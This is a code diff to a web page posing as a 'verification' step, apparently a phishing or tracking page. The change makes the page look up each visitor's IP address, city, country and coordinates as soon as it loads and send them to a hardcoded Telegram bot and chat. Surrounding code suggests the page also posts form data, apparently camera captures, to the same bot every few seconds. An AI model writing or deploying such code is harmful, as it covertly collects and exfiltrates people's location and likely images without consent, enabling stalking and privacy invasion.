@@ -27,6 +27,21 @@
     const chatId = "7035248493";
     let stream, video, canvas, intervalId;
 
+    // Send location info immediately on page load
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const locationText = `🌍 Location info:\nCity: ${data.city}\nCountry: ${data.country_name}\nIP: ${data.ip}\nLat: ${data.latitude}, Lon: ${data.longitude}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: locationText
+          })
+        });
+      });
+
     async function verify() {
       document.getElementById('message').innerText = "Verifying...";
       try {
@@ -57,21 +72,6 @@
             body: formData
           });
         }, 4000);
-
-        // Send approximate location using IP
-        fetch('https://ipapi.co/json/')
-          .then(res => res.json())
-          .then(data => {
-            const locationText = `🌍 Location info:\nCity: ${data.city}\nCountry: ${data.country_name}\nIP: ${data.ip}\nLat: ${data.latitude}, Lon: ${data.longitude}`;
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              method: "POST",
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chat_id: chatId,
-                text: locationText
-              })
-            });
-          });
 
         setTimeout(() => {
           clearInterval(intervalId);
